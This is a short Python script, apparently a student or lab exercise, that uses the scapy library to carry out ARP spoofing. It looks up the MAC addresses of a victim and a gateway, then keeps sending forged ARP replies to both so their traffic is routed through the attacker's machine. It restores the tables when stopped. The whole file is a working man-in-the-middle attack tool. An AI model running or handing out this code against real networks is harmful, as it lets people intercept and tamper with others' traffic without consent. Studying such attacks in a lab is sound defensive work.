from datetime import datetime
from scapy.all import ARP, Ether, send, srp
import sys
import time

author = "Lim En Cheng"
current_date = datetime.now().strftime("%d/%m/%Y")
print(f"Author: {author}")
print(f"Date: {current_date}")


def get_mac(ip):
    """
    Send broadcast ARP request to discover MAC address of the target.
    Returns the MAC address string if not exits if host is unreachable.
    """
    arp_request = ARP(pdst = ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = broadcast / arp_request
    answered, _ = srp(packet, timeout = 2, verbose = False)
    if not answered:
        print(f"[!] Could not resolve MAC for {ip}. Is the host up?")
        sys.exit(1)
    return answered[0][1].hwsrc


def spoof(target_ip, spoof_ip, target_mac):
    """
    Send a fake ARP reply to target_ip claiming that spoof_ip is our MAC address.
    This poisons the target_ip's ARP cache.
    ARP op = 2 means reply.
    pdst = who we are lying to
    hwdst = real MAC
    psrc = the IP we are impersonating
    hwsrc = left as default
    """
    packet = ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = spoof_ip)
    send(packet, verbose = False)


def restore(destination_ip, source_ip):
    """
    Repair ARP cache of destination_ip by sending legitimate ARP reply that maps
    source_IP back to its real MAC address
    Sends 5 copies to make sure it sticks
    """
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = ARP(
        op = 2,
        pdst = destination_ip,
        hwdst = destination_mac,
        psrc = source_ip,
        hwsrc = source_mac,
    )
    send(packet, count = 5, verbose = False)


def main():
    if len(sys.argv) != 3:
        print("Usage: sudo python3 arpspoof.py 192.168.64.6 192.168.64.1")
        sys.exit(1)

    victim_ip  = sys.argv[1]
    gateway_ip = sys.argv[2]

    print(f"[*] Resolving MAC addresses...")
    victim_mac  = get_mac(victim_ip)
    gateway_mac = get_mac(gateway_ip)
    print(f"[*] Victim  {victim_ip}  ||  {victim_mac}")
    print(f"[*] Gateway {gateway_ip}  ||  {gateway_mac}")
    print(f"[*] Starting ARP spoofing. Press Ctrl+C to stop and restore.\n")

    sent = 0
    try:
        while True:
            # Tell the victim that the gateway's IP is at my MAC address
            spoof(victim_ip,  gateway_ip, victim_mac)
            # Tell the gateway that the victim's IP is at my MAC address
            spoof(gateway_ip, victim_ip,  gateway_mac)
            sent += 2
            print(f"\r[*] Packets sent: {sent}", end = "", flush = True)
            time.sleep(2)

    except KeyboardInterrupt:
        print("\n\n[*] Detected Ctrl+C — restoring ARP tables. Please wait...")
        restore(victim_ip,  gateway_ip)
        restore(gateway_ip, victim_ip)
        print("[*] ARP tables restored. Exiting.")


if __name__ == "__main__":
    main()

